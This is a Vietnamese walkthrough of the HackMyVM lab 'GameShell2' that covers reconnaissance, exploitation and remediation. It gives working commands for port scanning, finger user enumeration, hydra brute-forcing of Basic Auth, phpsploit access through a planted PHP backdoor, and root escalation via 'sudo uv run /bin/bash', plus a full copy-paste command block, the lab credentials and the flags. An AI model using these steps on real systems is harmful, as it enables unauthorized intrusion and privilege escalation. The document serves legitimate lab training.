# HackMyVM — GameShell2

## Thông tin bài lab

| Thành phần | Thông tin |
|---|---|
| Máy Kali | `10.0.2.15` |
| Máy GameShell2 (Target) | `10.0.2.13` |
| SSH | `22/tcp` |
| Finger | `79/tcp` |
| HTTP | `80/tcp` — Apache |
| User | `dt` |
| Password web `/terminal` | `purple1` |
| Password SSH | `0t4tdtlt` |
| VHost ẩn | `dev.astra.dsz` → `/var/www/dev` |
| Backdoor | `http://dev.astra.dsz/backdoor.php` |
| Sudo (www-data) | `(ALL) NOPASSWD: /usr/local/bin/uv` |

> **Quy ước**
>
> - 🟦 **Terminal Kali**: recon, fuzz, brute, SSH, phpsploit.
> - 🟥 **Trên Target**: đọc flag, enum sudo.
>
> Đặt biến:

```bash
ip=10.0.2.13
kali=10.0.2.15
```

---

# 1. Câu 1 — Khảo sát hệ thống

## 1.1. Xác định IP và quét cổng

### 🟦 Kali

```bash
ip=10.0.2.13
ping -c 4 $ip

nmap -p- -Pn -T4 --min-rate 5000 $ip
nmap -p 22,79,80 -sCV -Pn -T4 $ip
```

Kết quả mong đợi:

```text
22/tcp open  ssh
79/tcp open  finger
80/tcp open  http
```

---

## 1.2. Phân tích Port 80

```bash
curl -s http://$ip:80/ | head -30
```

Trang web là game đơn giản, không có form login. Cần fuzz thư mục/file ẩn.

---

## 1.3. Directory fuzzing

```bash
ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .txt,.html -fc 403
```

Kết quả quan trọng:

| Path | Status | Ý nghĩa |
|------|--------|---------|
| `index.html` | 200 | Trang game |
| `robots.txt` | 200 | Có thể mention `/_terminal/` |
| `terminal` | 401 | HTTP Basic Auth |
| `users.html` | 200 | Danh sách username |

---

## 1.4. Lấy danh sách user

```bash
curl -s http://$ip/users.html
```

Lưu các username vào file:

```bash
# Sao chép username từ trang vào userss.txt (mỗi user 1 dòng)
# Ví dụ:
cat > userss.txt << 'EOF'
# dán các username từ users.html vào đây
EOF
```

Hoặc extract nhanh nếu trang có cấu trúc rõ:

```bash
curl -s http://$ip/users.html | grep -oP '(?<=<[^>]*>)[a-zA-Z0-9_-]+(?=<)' | sort -u > userss.txt
# hoặc xem source và copy thủ công
```

---

## 1.5. Enum user qua Finger (Port 79) — tránh rabbit hole

Finger luôn trả banner `Welcome to Linux...` cho mọi query → tool tự động dễ báo false positive.

Dùng **positive matching** (tìm keyword `Login`):

```bash
cat > enum_finger.sh << 'EOF'
#!/bin/bash
HOST="10.0.2.13"

echo "[*] Enumerating users via finger..."
while IFS= read -r user; do
    [ -z "$user" ] && continue
    output=$(finger "$user@$HOST" 2>&1)
    if echo "$output" | grep -qi "Login"; then
        echo "[+] Valid user: $user"
        echo "$output"
        echo "---"
    fi
done < userss.txt
EOF
chmod +x enum_finger.sh
./enum_finger.sh
```

Kết quả: user hợp lệ duy nhất là **`dt`**.

Xác nhận thủ công:

```bash
finger dt@$ip
```

---

# 2. Câu 2 — Khai thác và chứng minh quyền truy cập

## 2.1. Brute-force HTTP Basic Auth trên `/terminal`

### 🟦 Kali

```bash
hydra -l dt -P /usr/share/wordlists/rockyou.txt $ip http-get /terminal
```

Kết quả:

```text
dt : purple1
```

---

## 2.2. Đăng nhập `/terminal` và chơi Snake

Mở trình duyệt:

```text
http://10.0.2.13/terminal
```

Đăng nhập: `dt` / `purple1`

Chơi game Snake đến **Score ≥ 15**. Sau đó giao diện hiện password mới:

```text
0t4tdtlt
```

> Đây là password SSH của user `dt`.

---

## 2.3. SSH as dt + User flag

```bash
ssh dt@10.0.2.13
# Password: 0t4tdtlt
```

Trong shell:

```bash
id
whoami
cat user.txt
# hoặc
cat /home/dt/user.txt
```

**User flag (theo writeup):**

```text
flag{user-3529555bd8220350defe5d0430784920}
```

*(Flag thực tế trên lab của bạn có thể khác — lấy theo output máy.)*

---

## 2.4. Enum nội bộ — tìm backdoor

### 🟥 Target (user dt)

```bash
ls -la ~
# Thấy thư mục/file phpsploit

ls -la /var/www/
# dev/ owned by www-data, permission 700 → dt không đọc được

# Tìm virtual host
ls -la /etc/apache2/sites-enabled/
cat /etc/apache2/sites-enabled/*
# hoặc
grep -r "ServerName\|DocumentRoot" /etc/apache2/ 2>/dev/null
```

Phát hiện VHost:

```text
dev.astra.dsz  →  /var/www/dev
```

Có PHP backdoor tại `/var/www/dev/backdoor.php` (phục vụ cho phpsploit).

---

## 2.5. Truy cập backdoor từ Kali

### 🟦 Kali — thêm hosts

```bash
echo "10.0.2.13  dev.astra.dsz" | sudo tee -a /etc/hosts
```

Kiểm tra:

```bash
curl -s -I http://dev.astra.dsz/backdoor.php
# hoặc
curl -s http://dev.astra.dsz/
```

---

## 2.6. Kết nối bằng phpsploit → shell www-data

Cài phpsploit nếu chưa có (trên Kali hoặc copy từ home của dt):

```bash
# Nếu có sẵn trên target, scp về
# scp -r dt@10.0.2.13:~/phpsploit ~/

# Hoặc clone
git clone https://github.com/nil0x42/phpsploit.git
cd phpsploit
# theo README cài dependency nếu cần
```

Chạy:

```bash
./phpsploit
# hoặc python3 phpsploit
```
khi đã vào phpsploit>
```bash
 set TARGET http://dev.astra.dsz/backdoor.php
 exploit
```

Khi vào session: phpsploit(dev.astra.dsz)>

```text
run id
run whoami
```

---

## 2.7. Privilege Escalation qua `uv`

### Trong p phpsploit(dev.astra.dsz)> 

```text
run sudo -l
```

Kết quả:

```text
User www-data may run the following commands on GameShell2:
    (ALL) NOPASSWD: /usr/local/bin/uv
```

`uv` là Python package/environment manager. `uv run` có thể thực thi lệnh tùy ý.

Lấy root flag:
tại phpsploit(dev.astra.dsz)> 

```text
run sudo /usr/local/bin/uv run cat /root/root.txt
```

Hoặc spawn shell root:

```text
 run sudo /usr/local/bin/uv run /bin/bash
```

**Root flag (theo writeup):**

```text
flag{root-983b0f2b5412aadd94ed08f249355686}
```

*(Lấy flag thực tế từ máy của bạn.)*

---

## 2.8. Chuỗi khai thác hoàn chỉnh

```text
┌────────────────────────┐
│ 🟦 KALI                │
│ 10.0.2.15              │
└───────────┬────────────┘
            │
            │ nmap → 22, 79, 80
            ▼
┌────────────────────────┐
│ 80/tcp                 │
│ ffuf → users.html      │
│        /terminal (401) │
└───────────┬────────────┘
            │
            │ Finger positive match
            ▼
┌────────────────────────┐
│ User: dt               │
│ Hydra → purple1        │
│ Snake score 15         │
│ → SSH pass 0t4tdtlt    │
└───────────┬────────────┘
            │
            │ SSH dt
            ▼
┌────────────────────────┐
│ user.txt               │
│ Apache VHost           │
│ dev.astra.dsz          │
│ phpsploit backdoor     │
└───────────┬────────────┘
            │
            │ phpsploit → www-data
            │ sudo -l → uv NOPASSWD
            ▼
┌────────────────────────┐
│ sudo uv run cat        │
│ /root/root.txt         │
└────────────────────────┘
```

---

## 2.9. Toàn bộ lệnh copy-paste

### 🟦 TERMINAL KALI

```bash
# ===== 0. Chuẩn bị =====
ip=10.0.2.13
kali=10.0.2.15

# ===== 1. Recon =====
nmap -p- -Pn -T4 --min-rate 5000 $ip
nmap -p 22,79,80 -sCV -Pn -T4 $ip

# ===== 2. Fuzz =====
ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .txt,.html -fc 403

# ===== 3. Lấy users =====
curl -s http://$ip/users.html
# Tạo userss.txt từ danh sách username trên trang

# ===== 4. Finger enum =====
cat > enum_finger.sh << 'EOF'
#!/bin/bash
HOST="10.0.2.13"
while IFS= read -r user; do
    [ -z "$user" ] && continue
    output=$(finger "$user@$HOST" 2>&1)
    if echo "$output" | grep -qi "Login"; then
        echo "[+] Valid user: $user"
    fi
done < userss.txt
EOF
chmod +x enum_finger.sh
./enum_finger.sh

# ===== 5. Brute /terminal =====
hydra -l dt -P /usr/share/wordlists/rockyou.txt $ip http-get /terminal
# → dt:purple1

# ===== 6. Mở browser chơi Snake đến score 15 =====
# http://10.0.2.13/terminal  → password SSH: 0t4tdtlt

# ===== 7. SSH =====
ssh dt@10.0.2.13
# password: 0t4tdtlt
# cat user.txt

# ===== 8. Trên target: tìm VHost =====
# grep -r ServerName /etc/apache2/ 2>/dev/null
# → dev.astra.dsz

# ===== 9. Kali: thêm hosts + phpsploit =====
echo "10.0.2.13  dev.astra.dsz" | sudo tee -a /etc/hosts

# Cài/chạy phpsploit
# set TARGET http://dev.astra.dsz/backdoor.php
# exploit
# run sudo -l
# run sudo /usr/local/bin/uv run cat /root/root.txt
```

---

# 3. Câu 3 — Đề xuất biện pháp khắc phục

## 3.1. Nguyên nhân chính

1. **users.html** công khai danh sách username.
2. **Finger** cho phép enum user (dù có banner giả).
3. **HTTP Basic Auth** mật khẩu yếu (`purple1` trong rockyou).
4. Password SSH lộ sau khi chơi game (không bảo vệ đủ).
5. **Virtual Host** `dev.astra.dsz` + PHP backdoor không được bảo vệ.
6. **sudo NOPASSWD** cho `/usr/local/bin/uv` → `uv run` = RCE root.

## 3.2. Biện pháp

- Xóa hoặc bảo vệ `users.html`, không lộ username.
- Tắt Finger nếu không cần, hoặc firewall port 79.
- Dùng mật khẩu mạnh + rate-limit / fail2ban cho Basic Auth và SSH.
- Không để backdoor PHP trên môi trường production; tách network VHost dev.
- Không cấp `NOPASSWD` cho binary có khả năng thực thi lệnh tùy ý (`uv`, `python`, `find`, …).
- Least privilege: www-data không nên có sudo.

---

# Kết luận ngắn gọn

## Câu 1

```text
22/tcp SSH | 79/tcp Finger | 80/tcp HTTP
users.html + Finger → user dt
/terminal (401)
```

## Câu 2

```text
Hydra → dt:purple1
Snake score 15 → SSH pass 0t4tdtlt
SSH dt → user flag
dev.astra.dsz + phpsploit → www-data
sudo uv run → root flag
```

## Câu 3

```text
Ẩn username + tắt Finger
Mật khẩu mạnh + bảo vệ VHost/backdoor
Thu hồi sudo uv NOPASSWD
```
